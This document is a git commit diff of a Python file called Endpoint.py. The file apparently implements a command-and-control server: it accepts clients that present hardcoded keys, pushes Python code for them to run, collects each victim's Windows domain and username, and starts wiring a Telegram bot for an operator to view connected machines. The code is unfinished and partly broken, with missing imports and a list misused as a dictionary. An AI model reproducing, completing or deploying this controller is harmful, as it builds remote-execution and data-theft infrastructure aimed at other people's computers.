2f09448ab7f9e02608d27faf7bafce5353fc1681
DemixPro <110328394+DemixPro@users.noreply.github.com>
2025-01-12 13:09:34 +0300

    Update Endpoint.py

--- Endpoint.py
+++ Endpoint.py
@@ -1,30 +1,70 @@
+import os
 import base64
 import socket
+import telebot
 import hashlib
+import keyboard
 import threading
 
-ClientKey = b"CK_H29DJLA23NV92MCBB09AQJ2IFV8"
-EndpointKey = b"EP_AL3290OSL2390G02MSXK30GL4DA"
+AuthorizatedClients = []
+Terminal = []
 
-Socket = socket.socket()
-Socket.bind(("0.0.0.0", 2896))
-Socket.listen(99999)
+def Endpoint():
+    global AuthorizatedClients, Terminal
 
-def ClientHandle(Client, Address):
-    print("Recived connection from '" + str(Address) + "'. Authorizating...")
+    ClientKey = b"CK_H29DJLA23NV92MCBB09AQJ2IFV8"
+    EndpointKey = b"EP_AL3290OSL2390G02MSXK30GL4DA"
 
-    if Client.recv(1024) == base64.b64encode(ClientKey):
-        Client.send(base64.b64encode(EndpointKey))
+    Socket = socket.socket()
+    Socket.bind(("0.0.0.0", 2896))
+    Socket.listen(99999)
 
-        print("Sending useless data...")
-        Client.send("""
-print("All checks are passed, everything is works perfectly. (From endpoint, with love.)")
-""".encode())
-    else:
-        print("Unauthorized.")
+    def ClientHandle(Client, Address):
+        print(str(Address), ": Authorization...")
 
-while True:
-    print("Waiting for connections...")
-    Client, Address = Socket.accept()
+        if Client.recv(1024) == base64.b64encode(ClientKey):
+            Client.send(base64.b64encode(EndpointKey))
 
-    threading.Thread(target=ClientHandle, args=(Client, Address,)).start()
+            Client.send(b"""import os
+Data = os.getenv("userdomain") + "/" + os.getenv("username")
+Socket.send(Data.encode())""")
+
+            Data = Client.recv(1024)
+
+            AuthorizatedClients[Data.decode()] = Client
+            print(Data.decode(), ": Authorized.")
+
+            print(AuthorizatedClients)
+
+            exit()
+        else:
+            print(str(Address), ": Unauthorized.")
+            try:
+                Client.close()
+            except:
+                pass
+            exit()
+
+    print("System: Waiting for connections")
+    while True:
+        Client, Address = Socket.accept()
+
+        threading.Thread(target=ClientHandle, args=(Client, Address,)).start()
+
+
+threading.Thread(target=Endpoint).start()
+
+ChatId = "Nonnonono litle bro"
+Bot = telebot.TeleBot("?")
+
+@Bot.message_handler()
+def Handle(Message):
+    if Message.chat.id != ChatId:
+        return
+    
+    if Message.text.lower() == "/start":
+        Markup = InlineKeyboardMarkup()
+        for Client in AuthorizatedClients:
+            Markup.add(InlineKeyboardButton("Кнопка 1", callback_data="but_1"))
+        
+        Bot.send_message(ChatId, "1")
